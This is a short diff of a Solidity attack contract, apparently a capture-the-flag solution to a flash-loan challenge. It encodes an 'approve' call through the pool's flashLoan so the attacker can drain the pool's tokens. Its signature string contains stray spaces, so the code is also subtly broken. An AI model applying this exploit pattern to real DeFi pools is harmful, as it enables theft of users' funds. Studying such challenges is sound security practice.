@@ -25,7 +25,7 @@ contract TrusterAttack {
 
         //call flashLoan with x borrowAmount, borrower = this
         //target = token 
-        this.balance = uint256(IERC20(tokenAddress).balanceOf(poolAddress));
+        balance = uint256(IERC20(tokenAddress).balanceOf(poolAddress));
         IPoolFunc(poolAddress).flashLoan(
             0,
             address(this),
@@ -33,7 +33,7 @@ contract TrusterAttack {
             abi.encodeWithSignature(
                 "approve(address , uint256) ",
                 address(this),
-                this.balance
+                balance
             )
         );
         //IERC20(tokenAddress).transfer(attackerAddress, balance);
